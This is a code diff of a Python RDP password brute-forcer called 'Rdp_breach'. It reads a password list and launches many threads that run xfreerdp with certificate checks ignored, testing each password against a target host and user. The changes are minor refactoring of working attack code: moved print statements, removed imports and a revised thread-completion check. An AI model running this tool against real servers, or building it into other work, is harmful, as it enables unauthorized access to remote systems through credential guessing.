@@ -1,7 +1,5 @@
 import subprocess
 import threading
-import socket
-import IPy
 class Rdpdata:
     port = 3389
     linux_path = "/usr/bin/xfreerdp"
@@ -39,9 +37,9 @@ class Rdp_breach:
                 print(f"{command}'s unknown")
                 break
         if Foundpassword == True and Foundaddress == True and Founduser == True:
-            print(f"====\nStarted BruteForce in..\nAddress => {Address}\nUser => {user}\nPassword list => {password}\n====")
             Rdp_breach.Cracker(self, Address, user, password)
     def Cracker(self, adress, user, password):
+        print(f"====\nStarted BruteForce in..\nAddress => {adress}\nUser => {user}\nPassword list => {password}\n====")
         file = open(password, "r")
         for passw in file.read().splitlines():
             if len(passw) != 0:
@@ -49,7 +47,7 @@ class Rdp_breach:
                     while self.Activethreads > self.Maxthread:
                         ''
                     threading.Thread(target=Rdp_breach.Crack, args=[self, adress, user, passw]).start()
-        if self.end == True:
+        if self.Activethreads == 0:
             print("Brute Force ended!")
     def Crack(self, address, user, password):
         command = f"{self.path} {self.Ipvalue}{address} {self.Portvalue}{str(self.port)} {self.Uservalue}{user} {self.Passwordvalue}{password} /cert-ignore -clipboard +auth-only"
